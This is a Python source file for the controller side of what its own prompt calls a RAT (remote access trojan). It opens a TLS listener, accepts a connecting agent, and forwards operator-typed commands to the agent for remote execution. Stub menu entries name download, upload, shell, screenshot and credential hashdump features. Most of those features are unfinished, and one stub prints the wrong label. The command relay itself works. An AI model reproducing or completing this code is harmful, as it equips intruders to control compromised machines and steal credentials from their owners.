import socket
import ssl
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

def menu_help() :
    print('help')

def download() :
    print('download')

def upload() :
    print('upload')

def shell() :
    print('shell')

def ipconfig() :
    print('ipconfig')

def screenshot() :
    print('ipconfig')

def search() :
    print('search')

def hashdump() :
    print('hashdump')



def main() :

    load_dotenv()
    ip_server = os.getenv('IP_SERVER')

    cert = './cert.pem'
    key = './key.pem'

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert, keyfile=key)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_server, SERVER_PORT))
    server_socket.listen(1)

    print(f"[*] Listening on {SERVER_PORT}...")

    # Envelopper le socket avec SSL
    with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
        client_socket, client_address = ssl_socket.accept()
        print("[+] Agent received !")

        while True:
            command = input("rat > Taper votre commande ici : ")
            if command.lower() == 'help':
                menu_help()
            elif command.lower() == 'download':
                download()
            elif command.lower() == 'upload':
                upload()
            elif command.lower() == 'shell':
                shell()
            elif command.lower() == 'ipconfig':
                ipconfig()
            elif command.lower() == 'screenshot':
                screenshot()
            elif command.lower() == 'search':
                search()
            elif command.lower() == 'hashdump':
                hashdump()
            elif command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            else:
                client_socket.send(command.encode())
                result = client_socket.recv(1024).decode()
                print(result)
        client_socket.close()
    server_socket.close()


if __name__ == "__main__":
    main()